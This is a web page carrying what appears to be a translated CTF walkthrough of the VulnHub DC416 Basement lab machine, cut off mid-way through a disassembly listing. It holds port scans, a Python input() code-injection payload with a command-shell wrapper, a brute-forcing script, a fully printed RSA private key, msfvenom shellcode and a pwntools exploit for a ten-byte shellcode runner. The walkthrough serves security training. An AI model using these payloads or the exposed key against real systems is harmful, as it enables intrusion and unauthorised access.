<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>VulnHub: Blind operation and Brownface in DC416 Basement</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Continuing CTF analysis from DefCon Toronto's conference. The tasks are provided by the VulnHub team, for which many thanks to them. And we will consi...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>VulnHub: Blind operation and Brownface in DC416 Basement</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/files/ece/eae/75f/eceeae75face42b2ab237d6974a25eda.png"><br>  Continuing CTF analysis from <a href="https://dc416.com/">DefCon Toronto's</a> conference.  The tasks are provided by the <a href="https://www.vulnhub.com/">VulnHub</a> team, for which <a href="https://www.vulnhub.com/">many</a> thanks to them.  And we will consider <a href="https://www.vulnhub.com/entry/dc416-2016,168/">DC416 Basement</a> . <br>  Below, you can see the previous ratapom: <br><ul><li>  <a href="https://habrahabr.ru/post/318372/">DC416 Dick Dastardly</a> </li></ul><a name="habracut"></a><br><br><h3>  Let's start </h3><br>  We start virtualka, and proceed to search for open ports: <br><pre><code class="bash hljs">$ sudo arp-scan -l -I wlan0 | grep <span class="hljs-string"><span class="hljs-string">"CADMUS COMPUTER SYSTEMS"</span></span> | awk <span class="hljs-string"><span class="hljs-string">'{print $1}'</span></span> | xargs sudo nmap -sV -p1-65535</code> </pre> <br><blockquote>  Nmap scan report for 192.168.1.221 <br>  Host is up (0.00086s latency). <br>  Not shown: 65529 closed ports <br>  PORT STATE SERVICE <br>  22 / tcp open ssh OpenSSH 6.7p1 Debian 5 + deb8u3 (protocol 2.0) <br>  80 / tcp open http Apache httpd 2.4.10 ((Debian)) <br>  8080 / tcp open http-proxy ------ [-&gt; +++ &lt;]&gt;. [-&gt; +++ &lt;]&gt; .---. ++++. <br>  8090 / tcp open unknown <br>  10,000 / tcp open snet-sensor-mgmt <br>  10001 / tcp open tcpwrapped <br>  MAC Address: 08: 00: 27: DF: F5: 5E (Oracle VirtualBox virtual NIC) </blockquote><br>  Scanning directories did not bring results: <br><pre> <code class="bash hljs">$ sudo dirsearch -u http://192.168.1.221 -w /usr/share/dirb/wordlists/big.txt -e php,txt,bak,jpg,json,html -r -f</code> </pre> <br><img src="https://habrastorage.org/files/da4/97b/fe9/da497bfe94d84ccfaeb82dbd255510f2.png"><br><br><h3>  Flag 1 </h3><br><pre> <code class="bash hljs">$ nc 192.168.1.221 10000</code> </pre> <br><img src="https://habrastorage.org/files/5ba/41e/6ec/5ba41e6ecdd240ac9fcb31409bf83837.png">
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Well, apparently this is <i>Python2</i> , with its great <i>input</i> function.  Let's try to execute our code and see the contents of the current directory: <br><pre> <code class="bash hljs">$ nc 192.168.1.221 10000 Please enther number of packets: __import__(<span class="hljs-string"><span class="hljs-string">'os'</span></span>).system(<span class="hljs-string"><span class="hljs-string">'ls'</span></span>) flag.txt ping.py run_ping.sh PING localhost (127.0.0.1) 56(84) bytes of data</code> </pre> <br>  For further convenience, arrange a small Python shell for yourself: <br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/python3 import socket from time import sleep host = '192.168.1.221' port = 10000 def connect(data): s = socket.socket() s.connect((host, port)) s.recv(1024) s.send(('%s\n' % data).encode()) sleep(0.5) req = s.recv(4096) print(req.decode()) cmd = '' while cmd != '\q': cmd = input('&gt; ') connect("__import__('os').system('%s')" % cmd)</span></span></code> </pre> <br>  Having looked around in the system, we take the first flag from the user's home directory: <br><pre> <code class="bash hljs">&gt; cat ./flag.txt flag{j4cks_t0t4L_l4cK_0f_<span class="hljs-variable"><span class="hljs-variable">$uRpr1sE</span></span>}</code> </pre> <br>  Plus, we find a strange file in the <i>.secret</i> directory: <br><pre> <code class="bash hljs">&gt; ls -ahl ..... drwx------ 2 jack jack 4.0K Nov 21 16:53 .secret &gt; ls -ahl .secret -rw------- 1 jack jack 2.0K Nov 21 16:53 marla.xip</code> </pre> <br>  The file seems to be for <i>Mac OS</i> , so leave it for now. <br><br><h3>  Flag2 </h3><br>  When scanning port 8090, <i>nmap</i> detected an unknown web service there, let's see what is there: <br><pre> <code class="bash hljs">$ curl http://192.168.1.221:8090</code> </pre> <br><pre> <code class="hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span>Moved<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> You should be <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">a</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">href</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://localhost/flag.mpg"</span></span></span><span class="hljs-tag">&gt;</span></span>redirected<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">a</span></span></span><span class="hljs-tag">&gt;</span></span>. <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  After running <i>wget</i> , an endless download has begun, probably the video is sent in a looped stream.  Interrupting the download and launching it we hear a robotic female voice, which dictates the following sequence to us: <br><blockquote>  102 108 97 103 123 98 82 52 105 110 95 112 97 82 97 115 49 116 101 36 125 </blockquote><br>  It then reports that this is a flag and starts over.  Using the <a href="https://www.branah.com/ascii-converter">site</a> , convert it into text and get the next flag: <br>  <i>flag {bR4in_paRas1te $}</i> <br><br><h3>  Flag3 </h3><br>  Port 8080. This is probably also a web service by viewing the <i>ps</i> command log: <br><blockquote>  tyler 1319 0.0 0.1 4080 636?  S 11:49 0:00 / home / tyler / tiny 8080 </blockquote><br>  We recognize the user to whom he belongs, as well as the fact that the root directory is probably the user's directory.  Opening it in <i>curl</i> , we get an ASCII image and a rather weird server header: <br><pre> <code class="bash hljs">$ curl http://192.168.1.221:8080/ -vv</code> </pre> <br><blockquote><pre> <code class="hljs vbscript">* Hostname was <span class="hljs-keyword"><span class="hljs-keyword">NOT</span></span> found <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> DNS cache * Trying <span class="hljs-number"><span class="hljs-number">192.168</span></span><span class="hljs-number"><span class="hljs-number">.1</span></span><span class="hljs-number"><span class="hljs-number">.221</span></span>... * Connected <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> <span class="hljs-number"><span class="hljs-number">192.168</span></span><span class="hljs-number"><span class="hljs-number">.1</span></span><span class="hljs-number"><span class="hljs-number">.221</span></span> (<span class="hljs-number"><span class="hljs-number">192.168</span></span><span class="hljs-number"><span class="hljs-number">.1</span></span><span class="hljs-number"><span class="hljs-number">.221</span></span>) port <span class="hljs-number"><span class="hljs-number">8080</span></span> (#<span class="hljs-number"><span class="hljs-number">0</span></span>) &gt; <span class="hljs-keyword"><span class="hljs-keyword">GET</span></span> / HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> &gt; User-Agent: curl/<span class="hljs-number"><span class="hljs-number">7.35</span></span><span class="hljs-number"><span class="hljs-number">.0</span></span> &gt; Host: <span class="hljs-number"><span class="hljs-number">192.168</span></span><span class="hljs-number"><span class="hljs-number">.1</span></span><span class="hljs-number"><span class="hljs-number">.221</span></span>:<span class="hljs-number"><span class="hljs-number">8080</span></span> &gt; Accept: */* &gt; &lt; HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> <span class="hljs-number"><span class="hljs-number">200</span></span> OK * <span class="hljs-built_in"><span class="hljs-built_in">Server</span></span> ------[--&gt;+++&lt;]&gt;.[-&gt;+++&lt;]&gt;.---.++++. <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> blacklisted &lt; <span class="hljs-built_in"><span class="hljs-built_in">Server</span></span>: ------[--&gt;+++&lt;]&gt;.[-&gt;+++&lt;]&gt;.---.++++. &lt; Content-length: <span class="hljs-number"><span class="hljs-number">36246</span></span> &lt; Content-type: text/html</code> </pre> </blockquote><br>  Very similar to <i>brainfuck</i> .  After decoding, for example, <a href="https://sange.fi/esoteric/brainfuck/impl/interp/i.html">here</a> we get the line: <i>webf</i> <br>  Scanning the directories of the result did not bring again, after long attempts, by connecting to this port via <i>netcat</i> , something began to clear up: <br><pre> <code class="bash hljs">$ nc 192.168.1.221 8080</code> </pre> <br><blockquote><pre> <code class="hljs xml">123 HTTP/1.1 501 Not Implemented Content-type: text/html <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span>Error<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">bgcolor</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">ffffff</span></span></span><span class="hljs-tag">&gt;</span></span> 501: Not Implemented <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span>+[-------&gt;++<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">]</span></span></span><span class="hljs-tag">&gt;</span></span>.+.+++++.[----&gt;+<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">]</span></span></span><span class="hljs-tag">&gt;</span></span>+++.++[-&gt;+++<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">]</span></span></span><span class="hljs-tag">&gt;</span></span>.+++++++++.++++++.-------.----------.: 123 <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">hr</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">em</span></span></span><span class="hljs-tag">&gt;</span></span>------[--&gt;+++<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">]</span></span></span><span class="hljs-tag">&gt;</span></span>.[-&gt;+++<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">]</span></span></span><span class="hljs-tag">&gt;</span></span>.---.++++.<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">em</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> </blockquote><br>  In response, we again received a response to the <i>brainfuck</i> , apparently this server only works on it.  The situation is further complicated by the fact that after each unsuccessful request, the server crashes.  Below is an attempt to implement brute directories: <br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/python3 import socket import sys import re from time import sleep def char2bf(char): result_code = "" ascii_value = ord(char) factor = ascii_value / 10 remaining = ascii_value % 10 result_code += "{}".format("+" * 10) result_code += "[" result_code += "&gt;" result_code += "{}".format("+" * int(factor)) result_code += "&lt;" result_code += "-" result_code += "]" result_code += "&gt;" result_code += "{}".format("+" * remaining) result_code += "." result_code += "[-]" return result_code def str2bf(string): result = "" for char in string: result += char2bf(char) return result def connect(file): host = '192.168.1.221' port = 8080 req = 'GET %s HTTP/1.0\n\n' % (str2bf(file)) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((host, port)) s.send(req.encode()) sleep(1) data = s.recv(90480) s.close() except: s.close() return 500 data = data.decode() if 'HTTP/1.1 404 Not Found' in data: pass elif 'HTTP/1.1 200 OK' in data: print('File %s found' % file) print(data) wlist = open(sys.argv[1]).read().splitlines() for item in wlist: if connect(item.strip()) == 500: print('Item %s not found' % item) sleep(500)</span></span></code> </pre> <br>  Throwing a small dictionary, with the possible contents of the user directory, you can run and go for tea: <br><pre> <code class="bash hljs">$ ./brainfuck.py <span class="hljs-built_in"><span class="hljs-built_in">test</span></span></code> </pre> <br>  However, after some time, in the log, we notice ssh user key <i>tyler</i> <br><div class="spoiler">  <b class="spoiler_title">id_rsa</b> <div class="spoiler_text">  File .ssh / id_rsa found <br>  HTTP / 1.1 200 OK <br>  Server: ------ [-&gt; +++ &lt;]&gt;. [-&gt; +++ &lt;]&gt; .---. ++++. <br>  Content-length: 1675 <br>  Content-type: text / plain <br><br>  ----- BEGIN RSA PRIVATE KEY ----- <br>  MIIEowIBAAKCAQEApTSRfQBEqWjDTZZp0YHpOzDQ8zmo2NvTguHworeU9Yk26Zez <br>  R3HtoKL99hRwJrqsRzeDb2OaZcnFgHAK95zEibHRJzXbWTJ8hq + lLri8gNM62WVf <br>  mMe5Jd5QWkrmskUxSX0mlj3faJwtDphYmWUUbn3CN1eDI7ePqoAcWpMFeqQYXe / 5 <br>  HaPrKZxe6WCQsgFcj3zIz + U9Qidz8x / ZKYDCFJ + aLuoo3HUB + EHT9abirjLKbHvM <br>  BcstMNt23GD3KF549M2d5i5YC7o6LD8yBwifIIS2g3wNRfOsplrY / DEacILqaI7p <br>  xM3EpIahPt / Vn3 / DylVNyHoXP / hbXLtgoZwYAwIDAQABAoIBAAedhbtaYM / iWWZh <br>  MZ2LvIGS / X7IwKTGdViKK7qEdeRfn91itcvsT4ThHo3SYV0Xq8tYnsFquPpKM8V4 <br>  5LiHTHQAc2C4VdUlw6G9xQKDV4Ukt4i / 6Ik1Y66AMfoHi9zZ3azCjR3N2leLI3SR <br>  xzvC8g8p0uMUMKJb2s6EO0pdjpoZlV / 6JbcckushCQIJieHr00pq / w1fcY438DoR <br>  OnPfGeJgkQQgfJ8W77CDNRtECpP8WBsr4hDJZXq3ink2BDZRYwO8o / nOuEGOKlAp <br>  34j7ks5M / LOcKVskdIzz2vCc0OvtyNQ0Fk / e1INbkbwvhKUgF9t4dCBC9wF4YKx7 <br>  lBK4eAECgYEA1ntOisRF9D3 + 7EBN3pCQ2SssXFpmdnYjdzX2aETfcnSzU52ODRGw <br>  p5BFkZBhnPz / as7BrvufRGSM76eBHzUaRA4mNEe2EX49PsGtr + ONo2jIU6Ee19WP <br>  0sn + iINdw9JOK9Rma7WlYdaJuEs4DRzO3LX9cn5P4IUgBUaUOv3RFAMCgYEAxS9c <br>  ZNYUfgV29tlUHzyqdSKIDt / jB7yNDyCGBJYy1KBO9vAkM44haqNln6eGXaveXxBh <br>  n + gRG + MD8NBUv8VfCoU7ZKqHWpzgDfJOa3DBFM + 8IcDRj1KT1weg4NRdlsmz4A1X <br>  / Os3RIlXZ5MHuTPnpXFcjS70oqbmDU571w9zrAECgYAQLHA5yp8z0dD9Y8P7eo9R <br>  sQ3BURfU6we1n54bMsZezSoQrhreJW1a1WhJl8eknPdtyHWWimbyM1rlX44 / GjQG <br>  2cJLwvSZ0RkxOE2uq8wsfGRO2iGHSRV1YcIN7UoO0DcQ2w12JdZ40ELGYPWzF28J <br>  + bdJAPlpBuDpRO88m5M + nQKBgGoXglGqsVngnNJRuiYYYOonCyddpGwcMZUK / bBo <br>  E689FV9dc0zd0vLqORo + a1foyftB + BSuKs5jRVKC9KY9jlY9uuf9rFe / gfle / nxm <br>  LSyCXImYkefYGT0fmJp / CF / B5GrPIyEseQ8CCinq / MPTvnXQWWiI9AyzWaGdMZpT <br>  cPwBAoGBAIAULQyYmeipsRQvKUMCjVFPIpv2IXxnFTnaiJ1kbPOuN7MuagRD1ZDf <br>  FmPq8mIDg2oCKIq0 / iOsmGmLaPXJADXAOXFWjDmWTHt7RKBvxOT6fNfCqEW29wkG <br>  6XOdjh0Q6lKwxyOuFamIaEmCgoq7Ez7aRwgzf5KzIrw / vV3reIzI <br>  ----- END RSA PRIVATE KEY ----- <br></div></div><br>  We try to log in, and find the following flag: <br><pre> <code class="bash hljs">$ ssh -i /tmp/id_rsa tyler@192.168.1.221</code> </pre> <br><img src="https://habrastorage.org/files/c25/92c/049/c2592c0494ca4d33a50593dcde9bd80c.png"><br><br><h3>  Flag 4 </h3><br>  We still have port 10001. From the <i>ps</i> log you can see that the <i>10 byte</i> service is hanging on this port <br><blockquote>  robert 1331 0.0 0.5 19644 2748?  S 11:50 0:00 socat TCP-LISTEN: 10001, reuseaddr, fork, range = 127.0.0.1 / 32 EXEC: ./ tenbytes, pty, stderr, echo = 0 </blockquote><br>  But when connecting from outside, nothing happens.  Let us ssh-tunnel to the attacked host: <br><pre> <code class="bash hljs">$ ssh -i /tmp/id_rsa -L 10001:127.0.0.1:10001 -N tyler@192.168.1.221</code> </pre> <br>  And so, when connected, we are asked to enter 10 bytes to run: <br><pre> <code class="bash hljs">$ nc 127.0.0.1 10001 Tee hee! Gimme ten bytes to run!</code> </pre> <br>  If we assume that most likely the reading is done using the <i>read</i> function, into a buffer, which is then executed via <i>call</i> .  That is more or less clear.  You need to send a code of 10 bytes.  Which then somehow starts the shell.  After seeing what the <i>read</i> function call looks like, for example on <a href="http://syscalls.kernelgrok.com/">this</a> site.  You may notice that the size of the buffer for reading is transmitted through the register <i>EDX</i> .  We can try to increase the value of <i>EDX</i> , thereby increasing the buffer for reading, then call the <i>read</i> function again, with the new buffer, and send our shell code there.  To write an exploit, we use the <a href="https://github.com/Gallopsled/pwntools">pwntools</a> framework. <br>  Prepare the shell: <br><pre> <code class="bash hljs">$ sudo msfvenom -p linux/x64/<span class="hljs-built_in"><span class="hljs-built_in">exec</span></span> cmd=/bin/sh -f py -v shell shell = <span class="hljs-string"><span class="hljs-string">""</span></span> shell += <span class="hljs-string"><span class="hljs-string">"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"</span></span> shell += <span class="hljs-string"><span class="hljs-string">"\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"</span></span> shell += <span class="hljs-string"><span class="hljs-string">"\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68"</span></span> shell += <span class="hljs-string"><span class="hljs-string">"\x00\x56\x57\x48\x89\xe6\x0f\x05"</span></span></code> </pre> <br>  Now directly the code that we will send to change the <i>EDX</i> : <br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">gen_payload</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(offset)</span></span></span><span class="hljs-function">:</span></span> payload = <span class="hljs-string"><span class="hljs-string">""</span></span> payload += <span class="hljs-string"><span class="hljs-string">"\x01\xd2"</span></span> <span class="hljs-comment"><span class="hljs-comment"># add edx, edx payload += "\x5f" # pop rdi payload += "\x48\x83\xef" + chr(offset) # sub rdi, offset payload += "\xff\xe7" # jmp rdi payload = payload.ljust(10, "\x90") return payload</span></span></code> </pre> <br>  I will explain a little what is happening here: <br><ul><li>  Double <i>EDX</i> </li><li>  If our assumption is correct, and the call is made via <i>CALL</i> , then we retrieve the return address in the unused register </li><li>  Through a sequential increase in the value of <i>offset</i> , we find <i>call read</i> </li><li>  Go to <i>read</i> , and fill in the rest with <i>NOPs</i> . </li></ul><br>  Initially, I tried to put any value greater than the sent shell into the <i>EDX</i> , but this did not work, so I tried to also pick up the <i>EDX</i> .  The final script is presented below: <br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python2 from pwn import * context(bits = 64, os = 'linux', aslr = True, ) port = 10001 host = '127.0.0.1' def encode_payload(p): return ''.join(['\\x%0.2x' % c for c in bytearray(p)]) def gen_payload(offset): payload = "" payload += "\x01\xd2" # add edx, edx payload += "\x5f" # pop rdi payload += "\x48\x83\xef" + chr(offset) # sub rdi, offset payload += "\xff\xe7" # jmp rdi payload = payload.ljust(10, "\x90") return payload isEdxValid = False validEdx = 80 # len(shell)==48 while isEdxValid == False: offset = 0 while offset &lt;= 255: try: log.info('Current offset is %d' % offset) p = remote(host, port) payload = gen_payload(offset) log.info( 'Payload: %s' % (encode_payload(payload)) ) p.recvline() EDX = 0x0a while EDX &lt; validEdx: p.send(payload) EDX += EDX log.info('EDX now is %d' % EDX) shell = "" shell += "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68" shell += "\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6" shell += "\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68" shell += "\x00\x56\x57\x48\x89\xe6\x0f\x05" log.info('Sending shellcode') p.send(shell) # check for no tty message p.sendline() output = p.recvline(timeout=0.5) if output and 'tty' in output: log.success('Found offset!!! %d' % offset) isEdxValid = True break if offset == 255: log.error('No valid offset found!') isEdxValid = False count += 1 p.close() except EOFError: log.warning('Error on offset %d' % offset) p.close() finally: offset += 1 validEdx += validEdx p.interactive()</span></span></code> </pre><br>  After the launch, the brute force shifts begin, and the number of <i>read</i> bytes is increased.  After some time, the necessary parameters were found, and we get access to the shell, from the user <i>robert</i> , and with it his flag: <br><img src="https://habrastorage.org/files/b99/855/3b9/b998553b979b4024b7835b0428d4b805.png"><br>  Below is the disassembled listing of the <i>main</i> function from the <i>tenbytes</i> application: <br><div class="spoiler">  <b class="spoiler_title">Main function</b> <div class="spoiler_text"><pre> <code class="hljs pgsql">.text:<span class="hljs-number"><span class="hljs-number">0000000000400626</span></span> main proc near ; DATA XREF: <span class="hljs-keyword"><span class="hljs-keyword">start</span></span> .text:<span class="hljs-number"><span class="hljs-number">0000000000400626</span></span> .text:<span class="hljs-number"><span class="hljs-number">0000000000400626</span></span> var_30 = qword ptr <span class="hljs-number"><span class="hljs-number">-30</span></span>h .text:<span class="hljs-number"><span class="hljs-number">0000000000400626</span></span> var_24 = dword ptr <span class="hljs-number"><span class="hljs-number">-24</span></span>h .text:<span class="hljs-number"><span class="hljs-number">0000000000400626</span></span> var_18 = qword ptr <span class="hljs-number"><span class="hljs-number">-18</span></span>h .text:<span class="hljs-number"><span class="hljs-number">0000000000400626</span></span> var_10 = qword ptr <span class="hljs-number"><span class="hljs-number">-10</span></span>h .text:<span class="hljs-number"><span class="hljs-number">0000000000400626</span></span> buf = qword ptr <span class="hljs-number"><span class="hljs-number">-8</span></span> .text:<span class="hljs-number"><span class="hljs-number">0000000000400626</span></span> .text:<span class="hljs-number"><span class="hljs-number">0000000000400626</span></span> push rbp .text:<span class="hljs-number"><span class="hljs-number">0000000000400627</span></span> mov rbp, rsp .text:<span class="hljs-number"><span class="hljs-number">000000000040062</span></span>A sub rsp, <span class="hljs-number"><span class="hljs-number">30</span></span>h .text:<span class="hljs-number"><span class="hljs-number">000000000040062</span></span>E mov [rbp+var_24], edi .text:<span class="hljs-number"><span class="hljs-number">0000000000400631</span></span> mov [rbp<span class="hljs-number"><span class="hljs-number">-48</span></span>], rsi .text:<span class="hljs-number"><span class="hljs-number">0000000000400635</span></span> mov edi, <span class="hljs-keyword"><span class="hljs-keyword">offset</span></span> s ; "Tee hee! Gimme ten bytes to run!" .text:<span class="hljs-number"><span class="hljs-number">000000000040063</span></span>A <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> _puts .text:<span class="hljs-number"><span class="hljs-number">000000000040063</span></span>F mov r9d, <span class="hljs-number"><span class="hljs-number">0</span></span> ; <span class="hljs-keyword"><span class="hljs-keyword">offset</span></span> .text:<span class="hljs-number"><span class="hljs-number">0000000000400645</span></span> mov r8d, <span class="hljs-number"><span class="hljs-number">0</span></span>FFFFFFFFh ; fd .text:<span class="hljs-number"><span class="hljs-number">000000000040064</span></span>B mov ecx, <span class="hljs-number"><span class="hljs-number">98</span></span> ; flags .text:<span class="hljs-number"><span class="hljs-number">0000000000400650</span></span> mov edx, <span class="hljs-number"><span class="hljs-number">7</span></span> ; prot .text:<span class="hljs-number"><span class="hljs-number">0000000000400655</span></span> mov esi, <span class="hljs-number"><span class="hljs-number">4096</span></span> ; len .text:<span class="hljs-number"><span class="hljs-number">000000000040065</span></span>A mov edi, <span class="hljs-number"><span class="hljs-number">0</span></span> ; addr .text:<span class="hljs-number"><span class="hljs-number">000000000040065</span></span>F <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> _mmap .text:<span class="hljs-number"><span class="hljs-number">0000000000400664</span></span> mov [rbp+buf], rax .text:<span class="hljs-number"><span class="hljs-number">0000000000400668</span></span> mov rax, [rbp+buf] .text:<span class="hljs-number"><span class="hljs-number">000000000040066</span></span>C mov edx, <span class="hljs-number"><span class="hljs-number">0</span></span>Ah ; nbytes .text:<span class="hljs-number"><span class="hljs-number">0000000000400671</span></span> mov rsi, rax ; buf .text:<span class="hljs-number"><span class="hljs-number">0000000000400674</span></span> mov edi, <span class="hljs-number"><span class="hljs-number">0</span></span> ; fd .text:<span class="hljs-number"><span class="hljs-number">0000000000400679</span></span> mov eax, <span class="hljs-number"><span class="hljs-number">0</span></span> .text:<span class="hljs-number"><span class="hljs-number">000000000040067</span></span>E <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> _read .text:<span class="hljs-number"><span class="hljs-number">0000000000400683</span></span> mov rax, [rbp+buf] .text:<span class="hljs-number"><span class="hljs-number">0000000000400687</span></span> mov [rbp+var_10], rax .text:<span class="hljs-number"><span class="hljs-number">000000000040068</span></span>B mov rax, [rbp+var_10] .text:<span class="hljs-number"><span class="hljs-number">000000000040068</span></span>F mov [rbp+var_18], rax .text:<span class="hljs-number"><span class="hljs-number">0000000000400693</span></span> mov rax, [rbp+var_18] .text:<span class="hljs-number"><span class="hljs-number">0000000000400697</span></span> <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> rax .text:<span class="hljs-number"><span class="hljs-number">0000000000400699</span></span> mov rax, [rbp+buf] .text:<span class="hljs-number"><span class="hljs-number">000000000040069</span></span>D mov esi, <span class="hljs-number"><span class="hljs-number">4096</span></span> ; len .text:<span class="hljs-number"><span class="hljs-number">00000000004006</span></span>A2 mov rdi, rax ; addr 